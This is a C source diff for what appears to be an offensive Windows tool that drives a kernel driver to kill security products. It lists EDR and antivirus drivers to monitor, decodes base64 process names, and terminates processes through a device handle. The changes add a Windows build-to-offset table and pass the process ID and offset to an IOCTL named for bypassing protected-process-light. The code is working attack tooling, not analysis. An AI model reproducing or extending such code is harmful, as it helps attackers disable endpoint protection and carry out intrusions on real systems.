@@ -55,6 +55,11 @@ struct ModulesData {
     ULONG64 ModuleBase;
 };
 
+struct pplData {
+    DWORD pid;
+    DWORD offset;
+};
+
 //struct ModulesDataNode {
 //    ModulesData Data;
 //    ModulesDataNode* Next;
@@ -106,11 +111,86 @@ const char* monitoredDrivers[] = {
 	"tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
 };
 
+typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+
+
 
 BOOL Terminate(HANDLE, DWORD);
 DWORD FindProcessId(const char*);
 char* base64_decode(const char*);
 void killer_callback(threadArgs* args);
+
+
+DWORD GetWindowsBuildNumber(void) {
+    RTL_OSVERSIONINFOW info = { 0 };
+    info.dwOSVersionInfoSize = sizeof(info);
+
+    RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(
+        GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
+
+    if (pRtlGetVersion != NULL && pRtlGetVersion(&info) == 0) {
+        return info.dwBuildNumber;
+    }
+    return 0;
+}
+// temporanea. prima o poi faro' con gli offset presi dai symbol file scaricati
+DWORD getOffsetByBuild(void) {
+    DWORD build = GetWindowsBuildNumber();
+    printf("Detected Windows Build: %lu\n", build);
+	DWORD offset = 0;
+
+    switch (build) {
+    case 19041:  // Windows 10 2004
+        printf("Windows 10 version 2004 detected.\n");
+        offset = 0x87a;
+        break;
+
+    case 19042:  // Windows 10 20H2
+        printf("Windows 10 version 20H2 detected.\n");
+        offset = 0x87a;
+        break;
+
+    case 19043:  // Windows 10 21H1
+        printf("Windows 10 version 21H1 detected.\n");
+        offset = 0x87a;
+        break;
+
+    case 19044:  // Windows 10 21H2
+        printf("Windows 10 version 21H2 detected.\n");
+        offset = 0x87a;
+        break;
+
+    case 19045:  // Windows 10 22H2
+        printf("Windows 10 version 22H2 detected.\n");
+        offset = 0x87a;
+        break;
+
+    case 22000:  // Windows 11 21H2
+        printf("Windows 11 version 21H2 detected.\n");
+        offset = 0x87a;
+        break;
+
+    case 22621:  // Windows 11 22H2
+        printf("Windows 11 version 22H2 detected.\n");
+        offset = 0x87a;
+        break;
+
+    case 22631:  // Windows 11 23H2
+        printf("Windows 11 version 23H2 detected.\n");
+        offset = 0x87a;
+        break;
+    case 26100:
+         // Windows 11 24H2
+        printf("Windows 11 version 24H2 detected.\n");
+        offset = 0x5fa;
+		break;
+
+    default:
+        printf("Unknown or future Windows build: %lu\n", build);
+        break;
+    }
+	return offset;
+}
 
 
 // Find PID of a process by its executable name
@@ -148,7 +228,6 @@ DWORD FindProcessId(const char* processName) {
     return processId;
 }
 
-
 // Decode Base64 encoded process name
 char* base64_decode(const char* input) {
     DWORD decodedSize = 0;
@@ -185,8 +264,6 @@ char* base64_decode(const char* input) {
     free(decoded);
     return decodedStr;
 }
-
-
 
 BOOL Terminate(HANDLE hDevice, DWORD pid) {
     DWORD bytesReturned;
@@ -660,11 +737,17 @@ BOOL bypassPPL(HANDLE hDevice, DWORD pid) {
     ModulesData* resultArray = NULL;
     ULONG64 modulesCount = 0;
     BOOL result;
+	DWORD offset = getOffsetByBuild();
+
+	pplData data;
+	data.pid = pid;
+	data.offset = offset;
+
     result = DeviceIoControl(
         hDevice,
         IOCTL_PPL_BYPASS,
-        &pid,
-        sizeof(DWORD),
+        &data,
+        sizeof(pplData),
         NULL,
         0,
         &bytesReturned,
